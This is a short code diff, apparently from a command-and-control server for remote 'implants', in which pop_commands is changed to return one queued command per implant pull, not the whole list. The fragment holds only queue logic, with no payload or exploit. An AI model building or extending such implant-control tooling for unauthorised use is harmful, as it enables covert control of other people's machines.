@@ -48,11 +48,10 @@ class AgentHandler:
     def pop_commands(self, agent_id):
         # Vide la queue de commandes à chaque pull de l'implant
         with self.lock:
-            cmds = []
             if agent_id in self.agent_commands:
                 while self.agent_commands[agent_id]:
-                    cmds.append(self.agent_commands[agent_id].popleft())
-            return cmds
+                    return self.agent_commands[agent_id].popleft()
+        return ""
 
     def push_agent_result(self, agent_id, output):
         with self.lock:
